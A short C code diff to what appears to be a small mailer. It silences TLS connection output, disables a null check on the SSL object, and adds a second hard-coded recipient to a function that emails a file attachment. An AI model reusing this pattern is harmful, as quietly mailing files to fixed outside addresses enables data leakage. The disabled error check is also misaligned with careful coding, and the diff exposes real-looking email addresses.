@@ -93,13 +93,14 @@ static SSL *init_sock(const char *host, const int port) {
   /* Openssl */
   /* ------------------------ */
   SSL *s = SSL_new(SSL_CTX_new(TLS_client_method()));
-  if (!s) puts("s");
+  // if (!s) puts("s");
   SSL_set_fd(s, sockfd);
 
   SSL_connect(s);
-  printf("Connected with %s\n%s%s\n", SSL_get_cipher(s), SSL_get_cipher_name(s),
-         SSL_get_cipher_version(s));
-  ;
+  // printf("Connected with %s\n%s%s\n", SSL_get_cipher(s),
+  // SSL_get_cipher_name(s),
+  //      SSL_get_cipher_version(s));
+
   return s;
 }
 
@@ -127,6 +128,8 @@ int mail_me(const char *attachment) {
   READ;
 
   WRITE("RCPT TO:<t400.linux@gmail.com>\r\n");
+  READ;
+  WRITE("RCPT TO:<alexandru.bora@renault-trucks.com>\r\n");
   READ;
 
   WRITE("DATA\r\n");
